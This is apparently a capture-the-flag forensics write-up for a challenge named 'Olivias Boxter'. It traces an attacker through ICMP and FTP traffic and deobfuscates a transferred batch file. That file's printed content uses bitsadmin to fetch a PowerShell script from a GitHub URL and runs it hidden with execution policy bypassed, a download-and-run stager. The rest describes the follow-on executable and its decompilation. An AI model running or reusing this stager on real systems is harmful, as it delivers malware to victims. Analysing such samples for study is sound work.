---
title: "Olivias Boxter"
description: ""
summary: ""
date: 2024-10-14T00:56:01+08:00
lastmod: 2024-10-14T00:56:01+08:00
draft: false
menu:
  docs:
    parent: ""
    identifier: "olivias-boxter-03d48bbe0a3bd476ee010367edf02c89"
weight: 999
toc: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  noindex: false # false (default) or true
---
## Description
![](oli1.png)

## Solution
![](oli2.png) <br>  
Going through ICMP protocol, we can see some message there: “Boss, i have hacked into someone computer. Let me try the new malware we developed here!” <br>   

![](oli3.png) <br>   
Going through the FTP stream we can see the attacker log in using FTP and and perform file transferring. <br>   

![](oli4.png) <br>   
Looking the next stream would be the file that is transferred, which looks like an obfuscated batch file. We can search for [batch deobfusctator](https://github.com/DissectMalware/batch_deobfuscator) online to get the content of the file.<br>   

```batch {title="OliRod.bat"}
bitsadmin.exe /transfer "78fb98208c7f6ee6c0ed7bf761e614eb" https://raw.githubusercontent.com/6E3372/OliRod/main/Photo/Olivia.ps1 \Olivia.ps1

powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND "\Olivia.ps1" 
```
We can navigate to the GitHub link to download the PowerShell file named `Olivia.ps1`. <br>   
![](oli5.png) <br>  
This file is also kind of obfuscated which makes it hard for us to understand the function. We need to read and understand the code within the function in order to know what is going on in this file. <br>   
![](oli6.png) <br>   
Instead of understanding line by line and decoding it, we can just run the code using [tio.run](https://tio.run/#powershell).  We can deduce that this PowerShell script is trying to download `OliviaRodrigo.exe` and rename it into random strings. <br>   
![](oli7.png) <br>   
After downloading the file, using `strings` command we can guess that this might be a Python executable. Therefore, we can try to decompile it and get the source code. <br>   
![](oli8.png) <br>   
Decompile the exe by using [pyinstractor](https://github.com/extremecoders-re/pyinstxtractor) and [decompyle++](https://github.com/extremecoders-re/decompyle-builds/releases/tag/build-16-Aug-2024-dc6ca4a) so that we can get the source code back. <br>   
![](oli9.png)